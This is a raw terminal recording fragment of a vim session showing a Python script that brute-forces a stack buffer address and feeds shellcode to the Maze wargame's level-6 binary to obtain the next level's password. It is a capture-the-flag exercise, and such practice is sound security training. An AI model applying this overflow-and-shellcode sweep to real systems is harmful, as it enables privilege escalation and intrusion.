[283.437721, "o", "\u001b[?1006;1000h\u001b[?1002h\u001b[m\u001b[34;1H\u001b[K\u001b[34;1H\r\r\n\u001b[?25l\u001b[33;1H\"w6.py\" 27L, 979B\u001b[2;1H▽\u001b[6n\u001b[2;1H  \u001b[3;1H\u001bPzz\u001b\\\u001b[0%m\u001b[6n\u001b[3;1H           \u001b[1;1H\u001b[>c\u001b]10;?\u0007\u001b]11;?\u0007\u001b[?1006;1000l\u001b[?1002l\u001b[34;1H\u001b[32mPress ENTER or type command to continue\u001b[?25h\u001b[?1006;1000h\u001b[?1002h\u001b[1;1H\u001b[?25l\u001b[m\u001b[34;1H\u001b[K\u001b[34;1H:set noai nocin nosi indentexpr= formatoptions=\r\u001b[1;1H\u001b[L\u001b[1;1H\u001b[34m#!/usr/bin/env python3\r\r\n# Maze L6 sweep: buf's address is env-dependent (0xffffd824 under gdb), so\r\r\n# sweep +-0x1000 in 4-byte steps inside THIS live session's environment.\u001b[m\u001b[3;73H\u001b[K\u001b[4;1H\u001b[34m# A hit is visible as the shellcode's stdout: the maze7 password line.\u001b[m\u001b[4;71H\u001b[K\u001b[5;1H\u001b[35mimport\u001b[m subprocess, importlib.util\r\r\nspec = importlib.util.spec_from_file_location(\u001b[31m\"exploit\"\u001b[m, \u001b[31m\"/run/screen/l6/exploit.py\"\u001b[m)\r\r\nex = importlib.util.module_from_spec(spec)\r\r\nspec.loader.exec_module(ex)\r\r\nsc = \u001b[36mopen\u001b[m(\u001b[31m\"/run/screen/l6/sc.bin\"\u001b[m, \u001b[31m\"rb\"\u001b[m).read()\r\r\npath = \u001b[31mb\"/run/screen/l6/wP.txt\"\u001b[m\r\r\n\u001b[33mfor\u001b[m delta \u001b[33min\u001b[m \u001b[36mrange\u001b[m(-\u001b[31m0x1000\u001b[m, \u001b[31m0x1001\u001b[m, \u001b[31m4\u001b[m):\r\r\n    buf = \u001b[31m0xffffd824\u001b[m + delta\r\r\n    \u001b[33mtry\u001b[m:\r\r\n        pay = ex.build(buf, path, sc)\r\r\n    \u001b[33mexcept\u001b[m \u001b[32mAssertionError\u001b[m:\u001b[15;27H\u001b[K\u001b[16;9H\u001b[33mcontinue\u001b[m\u001b[16;17H\u001b[K\u001b[17;5H\u001b[33mtry\u001b[m:\u001b[17;10H\u001b[K\u001b[18;9Hr = subprocess.run([\u001b[31m\"/maze/maze6\"\u001b[m, path, pay], capture_output=\u001b[36mTrue\u001b[m, timeout=\u001b[31m5\u001b[m)\r\r\n    \u001b[33mexcept\u001b[m subprocess.TimeoutExpired:\u001b[19;38H\u001b[K\u001b[20;9H\u001b[33mcontinue\u001b[m\u001b[20;17H\u001b[K\u001b[21;1H    \u001b[33mif\u001b[m r.returncode == \u001b[31m0\u001b[m \u001b[33mand\u001b[m r.stdout:\u001b[22;9H\u001b[36mprint\u001b[m(\u001b[31m\"HIT buf\"\u001b[m, \u001b[36mhex\u001b[m(buf))\u001b[22;35H\u001b[K\u001b[23;9H\u001b[36mprint\u001b[m(r.stdout.decode(\u001b[31m\"latin-1\"\u001b[m))\r\r\n        \u001b[33mbreak\u001b[m\u001b[24;14H\u001b[K\u001b[25;1H\u001b[33melse\u001b[m:\u001b[25;6H\u001b[K\u001b[26;5H\u001b[36mprint\u001b[m(\u001b[31m\"none\"\u001b[m)\u001b[26;18H\u001b[K\u001b[27;1H\u001b[K\u001b[28;1H\u001b[1m\u001b[34m~                                                                                                   \u001b[29;1H~                                                                                                   \u001b[30;1H~                                                                                                   \u001b[31;1H~                                                                                                   \u001b[32;1H~                                                                                                   \u001b[33;1H~                                                                                                   \u001b[m\u001b[34;1H\u001b[K\u001b[34;83H1,1\u001b[11CAll\u001b[1;1H\u001b[?25h\u001b[?4m\u001b[?25l\u001b[34;73HdG\u001b[1;1H\u001b[34;73H  \u001b[1;1H\u001b[1;1H\u001b[K\u001b[2;1H\u001b[1m\u001b[34m~                                                                                                   \u001b[3;1H~                                                                                                   \u001b[4;1H~                                                                                                   \u001b[5;1H~                                                                                                   \u001b[6;1H~                         